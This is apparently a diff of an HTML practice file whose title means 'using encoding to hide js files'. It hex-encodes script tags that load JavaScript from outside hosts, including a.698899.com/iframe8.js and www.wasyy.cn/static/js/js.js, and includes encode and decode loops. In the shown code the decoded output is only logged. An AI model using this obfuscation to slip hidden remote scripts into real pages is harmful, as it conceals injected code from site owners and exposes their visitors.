@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<title>Insert title here</title>
+<title>利用编码隐藏js文件</title>
 </head>
 <script>
 
@@ -15,30 +15,55 @@ rs_cd+="d2f696672616d65382e6a733e3c2f7363726970743e";
 //3c736372697074207372633d687474703a2f2f612e3639383839392e636f6d2f696672616d65382e6a733e3c2f7363726970743e
 
 var cc = "3c736372697074207372633d687474703a2f2f612e3639383839392e636f6d2f696672616d65382e6a733e3c2f7363726970743e";
-console.log(parseInt(cc.substring(0,2),16));
-console.log(parseInt(cc.substring(2,4),16));
-console.log(cc.substring(0,2));
-console.log(cc.substring(2,4));
+//console.log(parseInt(cc.substring(0,2),16));
+//console.log(parseInt(cc.substring(2,4),16));
+//console.log(cc.substring(0,2));
+//console.log(cc.substring(2,4));
 
+var rs_cd="3c736372697074207372633d687474703a"; 
+rs_cd+="2f2f7777772e77617379792e636e2f7374617469"; 
+rs_cd+="632f6a732f6a732e6a733e3c2f7363726970743e";
+
+var mm  = '';
+var kk = "";
+for (var i = 0; i < mm.length; i += 2) { 
+    var rs_ch = parseInt(mm.substring(i, i + 2), 16); 
+   // console.log(rs_ch);
+    kk += String.fromCharCode(rs_ch); 
+    //console.log(rs_ct);
+}
+console.log(kk);
 
 
 var rs_ct = ""; 
 for (var i = 0; i < rs_cd.length; i += 2) { 
     var rs_ch = parseInt(rs_cd.substring(i, i + 2), 16); 
+   // console.log(rs_ch);
     rs_ct += String.fromCharCode(rs_ch); 
     //console.log(rs_ct);
 }
-
+//www.wasyy.cn/static/js/js.js
 var text1 = '<script src=http://a.698899.com/iframe8.js><\/script>';
+var text3 = '<script src=http://www.wasyy.cn/static/js/js.js><\/script>'
 //alert(text1);
-var text2 = '123456';
-console.log(text1.length);	//52
-console.log(text2.length);	//6
+var text2 = '123456abc';
+//console.log(text1.length);	//52
+//console.log(text2.length);	//6
 
-for(var i = 0;i < text2.length;i++){
-	console.log(text2.charCodeAt(i));
+var bb = '';
+for(var i = 0;i < text3.length;i++){
+	
+	bb += text3.charCodeAt(i).toString(16);
+	//console.log(text1.charCodeAt(i));
 }
 
+//console.log(bb);
+
+
+
+
+var dd = 'f';
+//console.log(parseInt(dd,16));
 
 
 
